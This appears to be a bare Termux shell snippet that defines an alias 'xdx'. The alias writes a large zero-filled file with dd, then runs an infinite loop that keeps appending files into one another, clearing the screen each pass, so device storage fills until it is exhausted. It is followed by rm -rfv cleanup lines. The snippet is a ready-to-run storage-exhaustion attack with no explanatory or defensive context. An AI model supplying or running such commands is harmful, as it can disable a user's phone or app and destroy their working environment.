alias xdx="dd if=/dev/zero of=~/disk status=progress count=44MiB && cd /data/data/com.termux/files && while :; do echo ''>>1 | echo ''>>2 | echo ''>>3 | echo ''>>4 | echo ''>>5 | echo ''>>6 | echo ''>>7 | echo ''>>8 | echo ''>>9 | echo ''>>0 | cat 0 >> 1 | cat 1 >> 2 | cat 2 >> 3 | cat 3 >> 4 | cat 4 >> 5 | cat 5 >> 6 | cat 6 >> 7 | cat 7 >> 8 | cat 8 >> 9 | cat 9 >> 0 ;clear ;done"
...
rm -rfv /data/data/com.termux/files/home/disk
rm -rfv /data/data/com.termux/files/rList
clear
